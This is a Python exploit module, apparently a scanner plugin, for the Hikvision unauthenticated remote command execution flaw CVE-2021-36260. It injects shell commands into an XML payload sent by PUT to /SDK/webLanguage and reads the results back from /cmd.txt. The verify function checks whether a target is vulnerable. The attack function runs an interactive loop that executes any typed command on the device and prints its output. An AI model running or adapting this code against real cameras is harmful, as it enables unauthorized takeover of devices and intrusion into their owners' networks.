import requests
import urllib, re
import string, random

def verify(url):
    relsult = {
        'name': '海康威视 未授权RCE(CVE-2021-36260)',
        'vulnerable': False,
        'url': url,
        'attack': True,
        'about': 'https://www.exploit-db.com/exploits/50441',
    }
    randstr = ''.join(random.sample(string.digits + string.ascii_letters, 20))
    cmd = 'echo {0}'.format(randstr)
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload = '<?xml version="1.0" encoding="UTF-8"?>' \
              '<language>' \
              '$({0}>webLib/cmd.txt)' \
              '</language>'.format(cmd)
    vurl = urllib.parse.urljoin(url, '/SDK/webLanguage')
    verify_url = urllib.parse.urljoin(url, '/cmd.txt')
    try:
        finger_rep = requests.get(url, headers=headers, verify=False, timeout=timeout)
        if len(finger_rep.headers['ETag']) > 0:
            rep = requests.put(vurl, timeout=timeout, verify=False, headers=headers, data=payload.encode('utf-8'))
            rep2 = requests.get(verify_url, timeout=timeout, verify=False, headers=headers)
            if rep.status_code == 500 and rep2.status_code == 200 and re.search(randstr, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, '/SDK/webLanguage')
    verify_url = urllib.parse.urljoin(url, '/cmd.txt')
    print('[+] Exploit loading......')
    try:
        cmd = ''
        while cmd != 'exit':
            cmd = input('[+] 执行命令 > ')
            payload = '<?xml version="1.0" encoding="UTF-8"?>' \
                      '<language>' \
                      '$({0}>webLib/cmd.txt)' \
                      '</language>'.format(cmd)
            rep = requests.put(vurl, timeout=timeout, verify=False, headers=headers, data=payload.encode('utf-8'))
            rep2 = requests.get(verify_url, timeout=timeout, verify=False, headers=headers)
            print('[*] Output:', rep2.text)

        return True
    except:
        return False








